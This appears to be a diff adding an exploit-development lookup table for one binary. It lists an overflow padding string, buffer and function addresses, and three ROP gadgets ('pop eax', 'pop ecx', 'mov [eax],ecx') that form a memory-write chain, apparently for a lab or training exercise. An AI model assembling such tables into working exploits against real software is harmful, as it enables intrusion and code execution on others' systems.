@@ -1,0 +1,14 @@
+overflow	41414141414141414141414141414141
+g_buffer0	38ef5300
+g_buffer1	F3530038
+g_buffer2	F7530038
+hexBuffer	74fE1900
+a1		A0054600
+unhexlify	C0054600
+main		70074600
+exit		50474C00
+printf		8E074600
+Gadget1	A9054600	// pop eax
+Gadget2	AB054600	// pop ecx
+Gadget3	AD054600	// mov [eax],ecx
+123456789	313233343536373839
